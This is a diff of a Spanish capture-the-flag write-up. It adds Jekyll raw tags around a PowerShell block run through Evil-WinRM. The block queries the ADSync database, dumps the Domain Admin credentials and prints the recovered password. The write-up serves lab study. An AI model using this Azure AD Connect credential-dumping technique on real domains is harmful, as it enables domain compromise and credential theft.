@@ -201,6 +201,7 @@ The command completed successfully.
 
 Y si enumero por bloodhound no me muestra una via para escalar privilegios hacia el usuario `Administrator` pero buscando en internet encuentro este [enlace](https://blog.xpnsec.com/azuread-connect-for-redteam/) que muestra un `PoC` de como abusar de este grupo para poder dumpear las credenciales del `Domain Admin` de la maquina, asi que solo sigo los comando a realizar para poder lograr el dump
 
+{% raw %}
 ```powershell
 *Evil-WinRM* PS C:\> $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=.;Initial Catalog=ADSync;trusted_connection=true;"
 *Evil-WinRM* PS C:\> $client.Open()
@@ -238,6 +239,7 @@ Username: administrator
 *Evil-WinRM* PS C:\> Write-Host ("Password: " + $password.Password)
 Password: d0m@in4dminyeah!
 ```
+{% endraw %}
 
 Veo que finalmente logre dumpear la contraseña del usuario `Administrator`
 ```bash
